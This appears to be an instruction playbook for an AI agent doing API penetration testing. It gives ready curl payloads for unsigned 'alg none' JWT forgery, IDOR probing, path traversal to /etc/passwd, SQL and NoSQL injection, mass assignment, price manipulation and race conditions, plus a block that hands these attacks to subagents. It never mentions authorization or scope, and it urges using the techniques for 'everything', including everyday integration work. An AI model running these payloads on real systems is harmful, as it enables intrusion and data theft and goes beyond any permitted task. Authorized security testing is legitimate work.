# Discipline 3: API Security

## YES WE DO THIS

API testing isn't just for security reviews. **Use it for everything:**
- Understanding how that API really works vs. the docs
- Finding better ways to integrate with services
- Debugging authentication issues
- Learning API design patterns
- Building more robust clients

**Every API is a puzzle.** Solve it.

---

## When to Use

- Testing REST, GraphQL, gRPC, SOAP APIs
- Finding authentication bypasses
- Testing for IDOR (Insecure Direct Object References)
- Analyzing rate limiting and business logic
- Understanding undocumented endpoints

**Also use for:** Understanding APIs you depend on, finding better integration patterns, debugging your own API clients, learning from well-designed APIs.

---

## Tools Required

**Core:**
- Burp Suite (web proxy, repeater, intruder)
- curl / httpie (command line HTTP)
- Postman / Insomnia (if GUI preferred)
- jq (JSON processing)

**Automated:**
- custom Python scripts (requests library)
- ffuf (fast web fuzzer)
- gobuster (directory/file enumeration)
- arjun (HTTP parameter discovery)

**Specialized:**
- graphql-playground (GraphQL testing)
- grpcurl (gRPC command line)
- swagger-codegen (API client generation)

---

## Step-by-Step Procedure

### Phase 1: Discovery & Enumeration (1-3 hours)

**1. Endpoint Discovery**

**From OpenAPI/Swagger:**
```bash
# If target has /swagger.json or /openapi.json
curl https://target.com/swagger.json | jq '.paths | keys'

# Generate client from spec
swagger-codegen generate -i swagger.json -l python -o client/
```

**From JavaScript:**
```bash
# Download and grep JS bundles
curl https://target.com/app.js | grep -oE "https?://[^\'\"]+" | sort -u

# Look for API calls
grep -oE "fetch\(|axios\.|api\." app.js
```

**From Mobile App:**
- Intercept with Burp/mitmproxy
- Look at all HTTPS traffic
- Document endpoints found

**Fuzzing for hidden endpoints:**
```bash
# Wordlist-based discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fc 404

# API-specific wordlist
gobuster dir -u https://target.com/api \
  -w api-endpoints.txt \
  -x json,xml
```

**2. Parameter Discovery**

```bash
# Find parameters with arjun
arjun -u https://target.com/api/endpoint

# Fuzz for parameters
curl "https://target.com/api/endpoint?FUZZ=test" \
  -H "Cookie: session=xyz"
```

**3. Technology Stack**

```bash
# Headers often reveal tech
 curl -I https://target.com/api

# Look for:
# Server: nginx/1.18.0
# X-Powered-By: Express
# X-Generator: Django
```

### Phase 2: Authentication Analysis (1-3 hours)

**1. Identify Auth Mechanism**

Common patterns:
- **JWT**: `Authorization: Bearer eyJ...`
- **Session Cookie**: `Cookie: sessionid=abc123`
- **API Key**: `X-API-Key: key_here` or query param
- **OAuth**: `/oauth/token`, `/auth/callback`

**2. JWT Analysis**

```bash
# Decode JWT (not encrypted, just encoded)
echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Look for:
# - alg (algorithm)
# - exp (expiration)
# - sub (subject)
# - Custom claims
```

**3. Token Lifecycle**

- How is token obtained?
- How is it refreshed?
- What happens when it expires?
- Can tokens be revoked?

**4. Session Testing**

```bash
# Concurrent sessions
curl -H "Authorization: Bearer TOKEN1" https://target.com/api/me &
curl -H "Authorization: Bearer TOKEN2" https://target.com/api/me &

# Token prediction
curl -H "Authorization: Bearer $(python3 -c 'import jwt; print(jwt.encode({"sub": "admin"}, "", algorithm="none"))')" https://target.com/api/admin
```

### Phase 3: Authorization Testing (2-6 hours)

**1. IDOR Testing (Insecure Direct Object References)**

For every endpoint with an ID:
```bash
# Your resource
curl https://target.com/api/users/123

# Try accessing other users
curl https://target.com/api/users/124
curl https://target.com/api/users/1
curl https://target.com/api/users/admin

# Try UUIDs if using UUIDs
```

**2. Parameter-based Access Control**

```bash
# Changing user_id parameter
curl "https://target.com/api/orders?user_id=123" \
  -H "Authorization: Bearer ATTACKER_TOKEN"

# Try: user_id, account_id, org_id, etc.
```

**3. HTTP Method Switching**

```bash
# GET → POST, PUT, DELETE
 curl -X POST https://target.com/api/users/123
 curl -X DELETE https://target.com/api/users/123
 curl -X PUT https://target.com/api/users/123 -d '{"admin": true}'
```

**4. Path Traversal in APIs**

```bash
# Try directory traversal in API paths
curl https://target.com/api/../../../etc/passwd
curl https://target.com/api/%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Phase 4: Input Validation & Injection (2-4 hours)

**1. Error Message Analysis**

```bash
# Trigger errors to understand backend
 curl https://target.com/api/search?q='
 curl https://target.com/api/search?q="
 curl https://target.com/api/search?q=${}
```

**2. SQL Injection in APIs**

```bash
# Standard SQLi patterns
curl "https://target.com/api/users?id=1' OR '1'='1"
curl "https://target.com/api/users?id=1' UNION SELECT * FROM admins--"

# JSON-based SQLi
curl -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "1\' OR \'1\'=\'1"}'
```

**3. NoSQL Injection**

```bash
# MongoDB-style
curl https://target.com/api/users?username[$ne]=admin
curl -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}}' \
  https://target.com/api/login
```

**4. Mass Assignment**

```bash
# Try adding extra fields
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "admin": true, "role": "superuser"}'
```

### Phase 5: Business Logic Testing (2-6 hours)

**1. Workflow Manipulation**

Skip steps in multi-step processes:
```bash
# Step 1: Start order
# Step 2: Normally add items
# Try: Go directly to payment without items
curl -X POST https://target.com/api/order/pay \
  -d '{"order_id": "NEW_ORDER_ID", "amount": 0}'
```

**2. Race Conditions**

```bash
# Send multiple simultaneous requests
for i in {1..10}; do
  curl -X POST https://target.com/api/apply-coupon \
    -d '{"code": "DISCOUNT50"}' &
done
wait
```

**3. Price Manipulation**

```bash
# Modify prices in cart/checkout
curl -X POST https://target.com/api/checkout \
  -d '{"items": [{"id": 1, "price": 0.01, "qty": 100}]}'

# Negative quantities
curl -X POST https://target.com/api/checkout \
  -d '{"items": [{"id": 1, "price": 100, "qty": -1}]}'
```

**4. Time-based Attacks**

```bash
# JWT expiration bypass
curl -H "Authorization: Bearer TOKEN_WITH_OLD_TIMESTAMP" \
  https://target.com/api/protected
```

---

## GraphQL-Specific Testing

**1. Introspection Query**

```bash
# Get full schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```

**2. Query Cost Analysis**

```bash
# Expensive nested queries
curl -X POST https://target.com/graphql \
  -d '{"query": "{ users { posts { comments { author { posts } } } } }"}'
```

**3. Mutation Testing**

```bash
# Unauthorized mutations
curl -X POST https://target.com/graphql \
  -d '{"query": "mutation { deleteUser(id: \"admin\") }"}'
```

---

## Expected Outputs

1. **api-map.md** — Complete endpoint inventory with methods, auth requirements
2. **auth-analysis.md** — Authentication mechanism fully documented
3. **vulnerabilities.md** — All findings with exploitation steps
4. **test-scripts/** — Reproducible curl/Python scripts for each finding
5. **business-logic-map.md** — Workflow documentation with bypass points

---

## Subagent Delegation

```python
delegate_task(tasks=[
    {
        "goal": "Enumerate all API endpoints",
        "context": "Target: https://target.com. Find: all REST endpoints, GraphQL if present, gRPC. Output to endpoint-inventory.md"
    },
    {
        "goal": "Test all endpoints for IDOR vulnerabilities",
        "context": "For each endpoint with IDs, test: sequential access, parameter tampering, cross-user access. Output to idor-findings.md"
    },
    {
        "goal": "Test authentication and session handling",
        "context": "Test: JWT structure, token lifecycle, session fixation, concurrent sessions, token prediction. Output to auth-findings.md"
    }
])

# You focus on:
# - Business logic testing
# - Manual injection attempts
# - Complex workflow analysis
```

---

## Pitfalls

**1. Rate Limiting**
- Start slow, ramp up
- Watch for 429 responses
- Use delays: `sleep 1` between requests

**2. Account Lockout**
- Be careful with brute force
- Check for lockout policies
- Test on non-production first

**3. Data Persistence**
- Your test orders/emails are real
- Clean up after testing
- Document what you created

**4. API Versioning**
- Test all versions (/v1/, /v2/, etc.)
- Legacy APIs often less secure

---

## Verification

- [ ] All endpoints documented with auth requirements
- [ ] At least one IDOR or auth bypass demonstrated
- [ ] Input validation tested on all parameters
- [ ] Business logic workflows mapped
- [ ] Race conditions tested where applicable
- [ ] Everything documented in engagement folder
- [ ] Added novel technique to library/what-worked.md

---

## Continuous Learning

**Add to library when you:**
- Find new IDOR pattern
- Bypass new auth mechanism
- Discover novel injection technique
- Find interesting business logic flaw

**Document:**
- The exact payload
- Why it worked
- How to detect it
- How to prevent it

---

## Daily Use

**Use API testing for:**
- Understanding how your dependencies actually work
- Debugging why your API client fails
- Learning from well-designed APIs
- Finding better integration patterns

**Example:** That API endpoint is slow. Test different parameters to find the bottleneck.

YES WE DO THIS. Every API call is a learning opportunity.
